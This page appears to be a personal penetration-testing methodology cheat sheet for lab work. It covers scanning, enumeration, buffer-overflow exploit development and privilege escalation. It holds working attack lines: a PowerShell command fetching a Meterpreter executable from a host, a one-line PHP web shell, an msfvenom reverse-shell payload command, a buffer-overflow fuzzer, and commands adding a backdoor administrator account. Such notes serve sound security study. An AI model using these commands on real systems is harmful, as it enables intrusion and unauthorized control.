---
layout: page
title: 'Tactics Techniques and Procedures (TTP):'
permalink: /process/
published: true
---
## Process

__Target Identification:__

This is sometimes a given if running your own VM but if on the local network and needing to further identify targets:
	- arp-scan --localnet
    - ping sweep - using nmap -sn > insert subnet here
    - passive listening using Wireshark/tcpdump

__Enumeration:__

The never-ending process. The needle in the stack of needles. Here are some methods:

Phase 1:
    - Nmap #1: "Shotgun" scanning via the -A option (optional -sC for running default scripts).
    - Nmap #2: Extended TCP scanning -p1-65535 -sV --reason (with versioning and reason).

Phase 2: Conditional, based on output of Phase1, but often involves the following enumeration tools to find more information on resources the target is exposing:

| Service | Tool | Description |
| --- | --- | ---: |
| Web | Nikto | Vuln Scanner |
| Web | Dirb | Web Directory Scanner |
| Web | Wfuzz | Fuzzer |
| Web | Fimap | Spider/LFI/RFI |
| Web | Curl | Transfer Utility |
| SMB | Enum4linux | Network Share Scanner |
| Various | NetCat | Network Connection Utility |
{:.mbtablestyle}

Of course this is just a small sample of tools, and very focused on web exploitation. In many cases information can be gathered through investigative methods such as:
- Source code viewing (web pages, or scripts on web pages).
- Using the "strings" command to pull readable strings from downloaded files. 
- Utilizing a proxy (such as Burp Suite or Zed Attack Proxy) for analyzing, modifying, or fuzzing information from web services, although this blurrs the line a bit between a somewhat passive enumeration event and active information gathering event.

Supplied tools and intuition are sometimes not enough however and the ability to script ones own tools for the occasion are necessary. What are we if not adaptable, and so the formats used here have to be as varied as the targets. Below are some snippets of scripts that may make parts of these phases easier:

__Script Snips:__

****BASH***  
For loop example:  
	for server in $(cat $1 );do  
	host -t a $server |grep "has address"  
	done  

****Python***  
Simple socket script (with options) for sending incrementing "A's" for determining buffer overflow.  

#!/usr/bin/python  
import socket  

import argparse  

ap = argparse.ArgumentParser()  
ap.add_argument("-ip", "--ipaddress", required=True,  
        help="IP Address of host")  
ap.add_argument("-p", "--port", required=True, type=int,  
        help="Port of host")  
args = vars(ap.parse_args())  

RHOST = args["ipaddress"]  
RPORT = args["port"]  
buffer=["A"]  
counter=100  
while len(buffer) <= 30:  
   buffer.append("A"*counter)  
   counter=counter+200  
for string in buffer:  
   print "Fuzzing with %s bytes" % len(string)  
   s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
   connect=s.connect((RHOST, RPORT))  
   s.send(string + '\r\n')  
   s.recv(1024)  
s.close()  

****Powershell***  
.NET object to download a remote file:  

(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')  
****PHP***  
Small Web shell:  

php system ($_GET[“cmd”]);



__BufferOverflow:__  

Some services will accept user input, but are not configured correct, in that they do not filter or allocate the correct input exactly so that sending more input than what the program is expecting will overwrite the programs execution flow and it will crash. If this is the case, sometimes a script can be created that controls this overflow behavior and instead of crashing the program, instructs it to do whatever the attacker wants (usually establishing a reverse shell or executing other malicious programs).  Below is a very short list of steps to BoF:  

__BoF Phase1:__  
1. Use a "fuzzing" script to detemrmine if the program is susceptible to crashing at a determined input amount. Use a debugger to ensure that the EIP register is overwritten with "A's".  
2. Create a unique pattern (MetaSploit's pattern_create can be used) based on the amount of data that previously crashed. Send the pattern to the program via modified script and copy the pattern that appears in the EIP.  
3. Use MetaSploit's pattern_offset tool to determine where in the unique value the EIP previously obtained, is included (what bit value, or point in the whole pattern was this bit that fit into the EIP is at).  
4. Modify script to include the crashing byte amount and the offset (set a different value for this, only 4 "B's" or \x42). Include trailing "C's" or \x43 for padding. This will be a placeholder for shellcode.  

__BoF Phase2:__  
5. Find bad characters that the program will not accept. If using Immunity debugger, the Mona module is good for this.  
6. Use this information to perform wider search for memory locations to pivot to with "JMP ESP" instruction set. This can be done via Mona using "!mona jmp -r esp -cpb "badCharacters". Focus on modules with no DEP or ASLR protections.  
7. Remember that the value found here must be placed into script used in Little-Endian format (backwards), or using a module that does this conversion for you.  

__BoF Phase3:__  
8. Shellcode generation. Sample shellcode using MSFVenom is as follows:  
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.232.130 LPORT=443 -b “\x00\x0a” EXITFUNC=THREAD -f python  
Do not forget to include the bad characters you have found via the -b option.  
9. When testing the final script NOPs (\x90) may need to be added for additional padding.  
10. Test offline and not against target before the actual attack target.  

__Exploitation:__  
After gathering substantial amount of information about targets, and finding no other footholds a search for public exploitation is in order. This can be done via simple Google search or sites like [Exploit-DB](https://www.exploit-db.com/). The exploits found need to be looked at carefully. Versioning is very important. Bitness is very important for compiling and of course, looking over the code to ensure no addtional side exploitation of the attacking matchine is hidden is important too.  

__Compiling:__  
The following is a few commands used for compiling C:

gcc inputFile.c -l outputFile - Generic Linux compile.
i686-w64-ming32-gcc inputFile.c -lws2_32 -o outputFile.exe - Linux compile for Windows executable.  

__PrivEsc:__  
Inroads. Here are some quick and common enumeration steps once low privilege is obtained:

Linux:  
find / -perm -u=s -type f 2>/dev/null  - SUID search  
ls -al /etc/passwd - Can you write to the passwd file?  
ls -al /etc/*cron* - Check out all the crons
sudo -l - Can this user do anything as root?  
ps aux | grep root - What is running as root (or insert other user)?  

Windows:  
whoami /priv  
cmdkey /list  
accesschk.exe -accepteula -qwsu "Everyone" *  - Checks for writable files and folders  
accesschk.exe -uwcqv "Everyone" * - Checks for weak service permissions  
wmic service list brief - Service list  
net start  
sc query  
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """ - Searches for unquoted service paths  
Net user newuser newpass /add - Adds user  
Net localgroup Administrators newuser /add - Adds user to group  







        
